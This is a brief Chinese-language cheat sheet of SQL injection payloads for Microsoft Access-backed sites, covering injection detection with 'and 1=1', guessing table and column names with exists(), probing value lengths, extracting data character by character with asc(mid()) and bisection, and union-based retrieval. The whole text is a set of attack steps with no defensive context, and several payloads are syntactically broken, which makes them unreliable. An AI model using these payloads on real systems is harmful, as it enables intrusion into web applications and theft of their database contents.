- 判断注入
  - and 1=1
  - and 1=2

**access没有数据库名，所以从猜测表开始**
- and exists(select * from table_names)

**得到表名之后就要开始猜解列名**
- and exists(select column_name from table_names)


**得到列名之后就需要猜解具体的内容**
- and ( select * from top 1 len(column_name) from table_name ) >1

**可以用二分法去猜解值,脚本爆破**
- and ( select asc(mid(column_name, i, 1))) from table_name ) > 5

**或者可以order by 猜解字段然后 union select得到相关信息**
